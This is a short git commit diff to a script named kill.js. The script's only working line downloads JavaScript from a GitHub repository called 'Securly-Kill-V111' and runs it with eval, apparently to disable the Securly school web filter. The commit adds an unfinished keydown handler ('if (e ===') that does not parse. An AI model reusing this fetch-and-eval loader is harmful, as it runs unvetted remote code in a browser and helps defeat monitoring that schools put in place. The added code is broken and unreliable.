f169862ac8850825ba3abe2e8eb00b6380bd4350
TopG916 <137461829+TopG916@users.noreply.github.com>
2024-08-30 07:33:20 -0400

    Update kill.js

--- scripts/kill.js
+++ scripts/kill.js
@@ -1,2 +1,6 @@
 /// kill.js
+document.addEventListener("keydown", function (e) {
+  if (e ===
+  
+});
 fetch("https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js").then(r => r.text()).then(r => eval(r))
